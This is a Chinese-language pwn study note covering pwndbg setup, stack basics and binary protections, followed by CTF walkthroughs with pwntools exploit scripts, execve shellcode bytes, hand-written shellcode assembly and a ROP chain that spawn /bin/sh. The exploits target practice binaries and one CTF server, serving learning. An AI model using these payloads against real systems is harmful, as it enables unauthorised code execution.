### pwndbg环境配置&基础操作

#### **环境配置**

代码如下

```shell
apt update
apt install vim
apt install gcc
apt install  
apt install gdb
apt install git

apt install python3

git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

对于git clone等镜像打不开的问题，可以通过以下方式改变ubuntu服务器解决。

在terminal中输入'software-properties-gtk'

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159318.png)

在Download from处选择others改变服务器，地区选择China，选中后点击Select Best Server，ubuntu将自动匹配速度最快的服务器。

匹配完成后在terminal中输入'sudo apt update'，若执行代码中目标网址改变为国内网站则说明服务器修改成功。

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159320.png)

#### **pwndbg基础语法**

概览：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159321.png)

#gdb     初始化gdb以及pwndbg

#file ./(filename) 调试文件

#start 启动程序

#disass (functionname) 反汇编函数

举例:'disass main'效果如下：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159322.png)

#b *(address) 在该地址位置设置断点

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159323.png)

类似的命令：

#b function_name 给函数下断点

#b file_name:fun_name 同理，file_name指文件名

#b file_name:n 给文件的第n行下断点(#b n)

#i b 查看断点信息/#i r查看各个寄存器的值

运行命令

#r 开始运行

#s(si) 单步步进(step into)

#n(ni)单步步过(step over)

#c 一直执行到断点出现为止



#stack 查看栈

#q 退出



*补充 步进与步过的区别（与C语言编译器中debug选项相同）

step into:单步执行，遇到子函数就进入并且继续单步执行；

step over:在单步执行时，在函数内遇到子函数时不会进入子函数内单步执行，而是将子函数整个执行完在停止，也就是把子函数整个作为一步；

step return:在单步执行到子函数内时，用Step Return就可以执行完子函数余下部分，并返回上一层函数；

### 汇编语言初步

#### **栈结构**

栈是一个先入后出的有序列表，添加和删除只能在栈顶端(Top)操作，另一端为固定的一端，称为栈底(Bottom)。

#### **元素移动的方式：**

进栈出栈都要通过栈顶端操作；

进出栈都不移动栈底指针；

进出栈都要移动栈顶指针；

基于栈的定义可知，最先放入栈中元素在栈底，最后放入的元素在栈顶，从栈容器中而删除元素刚好相反，最后放入的元素最先删除，最先放入的元素最后删除。

栈和函数交互的简单图解：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159324.png)

#### **基础语法**

| 指令    | 具体操作                                      | 格式            |
| ------- | --------------------------------------------- | --------------- |
| mov     | 数据传输指令，将src传至dst                    | mov dst,src     |
| pop     | 弹出堆栈指令，将栈顶的数据弹出并存至dst       | pop dst         |
| add/sub | 加减法指令，将运算结果存到dst                 | add/sub dst,src |
| push    | 压入栈堆指令，将src压入栈内                   | push src        |
| lea     | 取地址指令，将mem的地址存至reg                | lea reg,mem     |
| call    | 调用指令，将当前的eip压入栈顶，并将ptr存入eip | call ptr        |
| leave   | 等于mov+pop                                   |                 |

#nop 空指令 不改变任何程序可以访问的寄存器

#endbr64 与CET技术有关，先不深入了解

#### **寄存器**

esp：栈顶地址，在压栈和退栈时发生变化
ebp：当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置
eip：用来存储即将执行的程序指令的地址
eax：通用寄存器，存放函数返回值

#### 其它通用寄存器：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159325.png)

文章：https://blog.csdn.net/weixin_43847969/article/details/104700736

#### **保护机制**

**CANARY(栈保护)**

栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而组织shellcode的执行。在linux中我们将cookie信息称为canary

gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。

```
gcc -fno-stack-protector -o test test.c  //禁用栈保护
gcc -fstack-protector -o test test.c  //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码
gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码
```

**FORTIFY**

fortify和栈保护都是gcc的为了增强保护的一种机制，防止缓冲区溢出攻击。并不常见

**NX(DEP)**

NX即No-execute(不可执行)，NX基本原理是将数据所在的内存页表示为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行saz指令，此时CPU就会抛出异常而不是执行恶意指令

```
gcc -z execstack -o test test.c //关闭NX保护
```

**PIE(ASLR)**

一般情况下NX(Windows平台上称其为DEP)和地址空间的分布随机化(ASLR)会同时工作。
内存地址随机化机制有以下三种情况：

* 0-表示关闭进程地址空间随机化
* 1-表示将mmap的基址，stack和vdso页面随机化
* 2-表示在1的基础上增加栈(heap)的随机化

可以方法基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码

```
gcc -no-pie -fno-stack-protector -z execstack -m32 -o read read.c 
```

**RELRO**

设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。

文章：https://blog.csdn.net/weixin_62675330/article/details/123203234

### 栈溢出 

#### 首先回顾一下函数在出栈时候的过程：

当一个函数正在运行的时候，栈内的状态应该是这样的：

<img src="https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159326.png" style="zoom:50%;" />

ReturnAddress内保存返回地址，这样放是为了退栈时将这个值返回给eip寄存器。在入栈时eip寄存器首先保存了进行调用之后的下一条指令地址，这样才能确保调用函数可以调用到被调用函数。

Caller's ebp 调用函数的基地址，退栈时这个地址进入ebp，使ebp回到指向的原来的栈底。

（之前没理解且比较抽象的一点就是：为什么说是把被调用函数的地址压栈但是实际存储的时调用函数的地址，事实上当caller's ebp作为栈顶时，其存储的确实是调用函数的基地址，但ebp的位置其实是处在被调用函数的基地址上的，同时当退栈的时候，战中的内容被重新写给ebp，也就达到了回到原位置的效果。）

退栈：先退出被调用函数的局部变量，再退出调用函数的基地址并进入ebp使ebp回到原地址，再退出返回地址并放入eip，这样整个调用函数和寄存器的状态回到了无被调用函数的时候。

#### 哪里能出现栈溢出？

在进出栈过程中，可以通过修改函数状态来进行攻击，而保存状态的寄存器eip就是核心。通过让eip载入包含攻击指令的“地址”达到目的。

比如，在退栈过程中，可以用攻击指令所在的地址覆盖本应该返回的返回地址。

同样的，在入栈过程中，可以通过让eip指向的函数地址改变为攻击指令所在的地址来达到攻击效果。

#### ShellCode-RET2TEXT

<img src="https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159327.png" style="zoom:50%;" />

基本构造如上图所示。

**payload :** padding1 + address of shellcode + padding2 + shellcode

几个注意点：

1.padding1的目的是把被调用函数的变量全部覆盖为乱七八糟的东西并且长度正好要达到返回地址之前（字符串不可以包含\x00否则会有截断）

2.Address of shellcode 即把shellcode所在的地址覆盖eip返回地址

3.padding1 长度任意

4.当ida/pwndbg等返回的shellcode起始地址不一样时，可以通过在 padding2 里填充若干长度的 “\x90”解决。这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处

5.shellcode必须使用十六进制机器码编写。

##### 攻防世界 Level0 RET2TEXT

先说几个比较常见的快捷键（毕竟第一次用ida并没有昨天借机子操作时侯的窗口）

*在一个窗口内可以右键在text view/graph view内切换。

*按下F5可以查看选取函数的伪代码（就是C语言输入的代码）

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159328.png)

很显然这个vulnerable_function是一个可疑函数，点进去看看

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159329.png)

首先定义一个长度为0x80的字符串，但第二句0x200uLL说明可以最多向其中输入0x200的内容。可以使用shellcode

进入buf看下栈结构：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159330.png)

注意看上面的解释：r和s分别代表返回地址和保存的寄存器，栈长度0x80,寄存器长度0x8。

<img src="https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159326.png" style="zoom:50%;" />

也就是说，只要把Local variable和caller's ebp全部用垃圾数据填满，就可以直接覆写return address。

找敏感函数的返回地址：callsystem

```c
int callsystem()
{
  return system("/bin/sh");

```

相当于直接打开shell。

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159331.png)

函数地址：0x400596（一定要注意，返回的地址需要是函数的地址，这样才能保证该函数被调用）

shellcode:

```python
from pwn import *
p = remote('61.147.171.105',56876)
address = p64(0x400596)
p.send(b'a'*0x88+address) 
p.interactive()
```

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159332.png)

用不了vim的原因是远程控制的主机并没有装vim。。。

一些基本指令：

from pwn import * #加载pwntools库

p = remote('61.147.171.105',56876) 根据端口/ip连接

interactive()#允许交互

recv(numb=字节大小, timeout=default)# 接收指定字节数

recvall() # 一直接收直到达到文件EOF



正打算交的时候学姐要求再来一个32的题，我就在网上又找了一道题来：

##### #Anonymous m32 RE2TEXT&CTF-wiki RET2TEXT

源码：

```C
#include <stdio.h>
#include <string.h>

void success() { puts("小黑子露出鸡脚了吧，哥哥下的蛋你别吃"); }

void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}

int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```

编译：

```C
gcc -m32 -fno-stack-protector -no-pie JNTM.c -o JNTM
```

*一开始还在纠结找不到32位的题怎么办，结果发现直接编不就行了吗（*

复习一下各个指令：

-m32：编译为32为可执行程序

-fno-stack-protector：关闭栈溢出保护

-no-pie：关闭地址随机化

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159333.png)

编译器会提示gets是不安全的函数，因为它没有对输入的字符长度做任何限制。

**gets函数原型：**char*gets(char*buffer);//读取字符到数组：gets(str);str为数组名。
　　gets函数功能：从键盘上输入字符，直至接受到换行符或EOF时停止，并将读取的结果存放在buffer指针所指向的字符数组中。读取的换行符被转换为null值，做为字符数组的最后一个字符，来结束字符串。

**fgets函数原型：**char *fgets(char *s, int n, FILE *stream);//
我们平时可以这么使用：fgets(str, sizeof(str), stdin);其中str为数组首地址，sizeof(str)为数组大小，stdin表示我们从键盘输入数据。
fgets函数功能：从文件指针stream中读取字符，存到以s为起始地址的空间里，知道读完N-1个字符，或者读完一行。　注意：调用fgets函数时，最多只能读入n-1个字符。读入结束后，系统将自动在最后加’\0’，并以str作为函数值返回。

为什么只能读n-1个字符？因为\0实际上占了一个字符位。而多出这个范围的字符会被存储在缓冲区中。

用IDA看看函数发育的正不正常（：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159334.png)

从这里可以看出来，变量所在位置是EBP地址-14h；

被调用函数的返回地址是EBP地址+4h

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159335.png)

vulnerable函数地址为0x80491C7（但这个其实是没用的，因为需要的不是vulnerable（）函数）

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159336.png)

success函数地址为0x8049166；

下面做一个简单的计算

vulenerable函数的返回地址就是EBP地址+4h=变量s地址+14h+4h=变量s地址+18h

所以需要填充18h字符长度的垃圾数据+success的地址即可

（18十六进制=24十进制，所以其实这里也可以用20个字符再加上ebp的地址，达到的是同样的效果（*垃圾教程还不如不看*））

shellcode:

```python
from pwn import *
cd = process("./JNTM")
whatever = 0x8049166
cd.sendline(b'A'*0x18 + p32(whatever))
cd.interactive()
```

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159337.png)

pwn!

小黑子（

*使用指令计算偏移量

```
cyclic 'n' #生成n个垃圾数据
```

怎么用呢？

首先输入cyclic 200(打个比方)，命令行中输出200个垃圾数据。

调试程序(gdb (file_name))，输入start开始运行，将垃圾数据粘贴入输入框：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159338.png)

提示在地址0x62616164处出错。

再输入cyclic查询语句：

```
cyclic -l *address
```

输出一个十进制数据，这就是需要填充的字符串长度（十进制）



*如何不完全借助ida实现偏移量计算？

（不得不说如果不是ida有的时候不准谁会看gdb啊，太乱了）

首先在ida中发现gets函数的调用位置：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159339.png)

上面两步lea/mov都是相对于esp的索引，所以需要在gets处下断点查询esp/ebp的位置

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159340.png)

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159341.png)

直观可以看出esp和ebp的位置。

##### 数据的大小端

小端：是指数据的高字节保存在内存的高地址中，而数据的低字节保存在内存的低地址中，这种存储模式将地址的高低和数据位权有效地结合起来，高地址部分权值高，低地址部分权值低。

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159342.png)

大端：是指数据的高字节保存在内存的低地址中，而数据的低字节保存在内存的高地址中，这样的存储模式类似于把数据当作字符串顺序处理：地址由小向大增加，而数据从高位往低位放。

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159343.png)

#对于数据的高字节和低字节，打个比方，0x123456中越靠近0x的部分越高。

注意一些问题：堆从低地址向高地址生长，栈从高地址向低地址生长。当堆栈重叠时会导致系统崩溃。

参考文档：https://blog.csdn.net/oqqHuTu12345678/article/details/82823890

#### Shellcode-RET2SHELLCODE

ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。**一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码**。

在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。

##### CTF-wiki ret2shellcode

首先checksec检查一下保护类型（终于有一个能用的checksec乐）

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159344.png)

没有栈保护/NX/地址随机化，开整

源代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf("bye bye ~");
  return 0;
}
```

strncpy()：用于将指定长度的字符串复制到数组中；这里是将通过gets输入的字符串，截取64u长度（十进制的100）输入到buf2中。

查看buf2的位置：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159345.png)

注意到这里的内存地址位于bss区（整体C语言的内存区域划分出门左转见C语言笔记）

bss段：属于静态数据区，用于储存未初始化的全局变量和静态变量。

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159347.png)

之前提到，对于需要自己注入shellcode的题目，需要检查可以注入的部分有无权限：在main函数处下断点之后使用vmmap命令检查对应内存地址所在的函数权限。

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159348.png)

bss区域内存地址范围为：0x804A040~0x804A080;

注意到0x804A000-0x804B000地址范围内为RWX最高权限，说明可以写入shellcode

计算偏移量：

使用cylic直接爆出112

payload:

```python
#!/usr/bin/env python
from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080
sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
sh.interactive()
```

shellcode = asm(shellcraft.sh())：生成shell机械码

##### Shellcode书写

首先放两个搜到的shellcode：

```
shellcode = "\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34"
```

```
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
```

*发现一个比较好用的反汇编方法（把ascii转换为IDA能看懂的汇编语言）

写一个小程序：

```c
#include <stdio.h>

char shellcode[] = "";
int main(){
	(*(void(*)())&shellcode)();
	return 0;
}
```

(*(void(\*)())&shellcode)();这句代码其实是定义的同时调用了一个函数

(void(*)())：强制类型转换，只不过转换的是函数，即将某个函数转换为一个没有返回值的函数指针

&shellcode：取地址；所以(void(\*)())&shellcode指的就是将shellcode的地址强制转换为一个没有返回值的函数指针，再嵌套一个(*)()也就是调用该函数。

编译源文件之后直接IDA打开，定位到shellcode函数就能看到shellcode的组成了。()

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159349.png)

之前的ret2shellcode使用的是pwntools的自动生成shellcode，这里对之前的语法做一些补充：

例如32位完整的生成代码;

```python
from pwn import*
context(log_level = 'debug', arch = 'i386', os = 'linux')
shellcode=asm(shellcraft.sh())
```

最后一行的shellcraft.sh也可以写为shellcraft.i386.linux.sh()

如果需要使用64位则把arch后的字符串改为amd64即可。

还有一些常见的网站和工具：https://blog.csdn.net/weixin_35238815/article/details/113039254

##### 手搓shellcode

以64位为例，大体上的过程是这样的：

1.系统调用execve函数，用来执行命令：execve("/bin/sh",0,0)

（execve函数原理：https://blog.csdn.net/weixin_43836778/article/details/123720092）

(execve(path,argv,envp)函数包含三个参数:path代表执行的二进制文件或者文件的绝对路径；argv表示完整的传参；envp表示指向该程序的所有指针，在shellcode中只需要执行/bin/sh即可所以后两个参数全部取0)

2.将第一个参数赋值/bin/sh

3.将剩下两个参数赋值0

为了保证execve函数可以被正常调用，需要在调用行为之前存储所有需要的参数。

| 注意事项                   |                                               |
| -------------------------- | --------------------------------------------- |
| 64位寄存器传参时优先使用： | rdi,rsi,rdx                                   |
| 64位系统调用号存储文件目录 | /usr/include/x86_64-linux-gnu/asm/unistd_64.h |
| 系统如何调用函数？         | 将函数的系统调用号放入rax，然后syscall        |

第一步：清空寄存器

```
xor rdx,rdx
xor rsi,rsi 
OR
mov rdx,0
mov rsi,0
//一般使用xor，因为xor占用字节更小的同时不需要考虑00字符截断的问题（没错 就是文件上传那里十六进制的00截断）
//刚看到代码的时候想了一下为什么是反过来的，这和栈结构从高地址向低地址生长和出入栈的顺序有关。后入栈的参数先出栈
```

函数截断属性：https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/

第二步：把"/bin/sh"传入rdi。这里只需要/bin/sh所在地址对应的ascii码传入rdi即可，这和C语言调用指针的方法相似——把地址扔给寄存器，寄存器自己去看地址里面存了什么东西。

```
xor rdi,rdi //现在rdi存储的值是0）
push rdi   //把rdi（值为0）入栈，用来截断execve函数
mov rdi,0x68732f2f6e69622f  //更改rdi值
push rdi    //将bin/sh/压入栈顶
lea rdi,[rsp]     //等同于mov rdi,rsp  把rsp本身的值（rsp本身就是个地址）赋值给rdi
```

这里还是要注意一下，最后一步是把rsp的地址（栈顶指针）赋给rdi，而不是把rsp里面存的东西扔给rdi。

0x68732f2f6e69622f是/bin//sh对应的ascii码。**并且他是倒着存的**，因为asm在把我们写的**汇编语言转换成机器码的时候，会因为小端序的原因将输入的内容给倒过来**。别的机器码我们不用担心，但是我们输入的字符串，需要手动先给倒过来一次，这样等到汇编语言转换成机器码的时候，再倒过来一次，程序处理字符串的时候，就会拿到真正的参数/bin//sh，而非hs//nib/

0x68732f2f6e69622f中间这里出现了两2f(也就是两个/)，因为这里要填充够八个字节（64位程序中，一个内存单元就只能装八个字节）。

在网上还找到了一种更加简洁的写法：

```
xor rdi,rdi
mov rdi,0x68732f6e69622f
push rdi
push rsp
pop rdi
```

通过去掉一个2f和去掉0的方式让mov指令只填充乐四个字节，这时系统发现填入的长度小于一个内存单元，会自动在mov指令内容之后再加0补全为8字节，自动截断了execve函数。

push rsp：将rsp的值（地址）压栈

pop rdi:把栈顶内容弹给rdi，即把刚刚赋值的rsp再赋值给rdi

第三步：将execve系统调用号赋值rax，syscall

```
xor rax,rax

mov rax,0x3b

syscall
```

总代码如下：

```
xor rax,rax
push 0x3b
pop rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f
push rdi
push rsp
pop rdi
xor rsi,rsi
xor rdx,rdx
syscall
```

32位代码：

```
xor ecx,ecx
xor edx,edx
xor ebx,ebx 
push ebx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor eax,eax
push 11
pop eax
int 0x80
```

参考文档：https://www.cnblogs.com/ZIKH26/articles/15845766.html

但这样的直接插入shell调用函数的方式只适用于NX保护未开启的程序，如果NX enabled该怎么办呢？

#### Shellcode-ret2syscall

##### CTF-wiki ret2syscall

首先checksec检查保护类型，发现NX保护打开

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159350.png)

在gets()函数处下断点（b gets)，直接r调试：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159351.png)

输入finish后再随意输入一些字符，然后再次回车，此时发现esp地址为0xffffcfcc,ebp地址为0xffffd038，相减后地址差为108（栈长度为108），因为为32位文件，所以需要覆盖的地址为108=4=112

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159352.png)

在前文的手搓shellcode部分，我们已经知道需要execve函数来构造shell从的。此时就需要gadgets。eax对应execve函数的系统调用号0xb，ebx对应/bin/sh的地址，ecx和edx全为0，这些参数需要自行寻找。

该题中各题gadgets如下：

```
EAX：
 ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
EBX+ECX+EDX:
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
/bin/sh:
0x080be408 : /bin/sh
int 0x80:
0x08049421 : int 0x80
0x080938fe : int 0xbb
0x080869b5 : int 0xf6
0x0807b4d4 : int 0xfc
```

知道这些之后就可以开始拼接了：

```python
from pwn import *

sh = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()
```

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159353.png)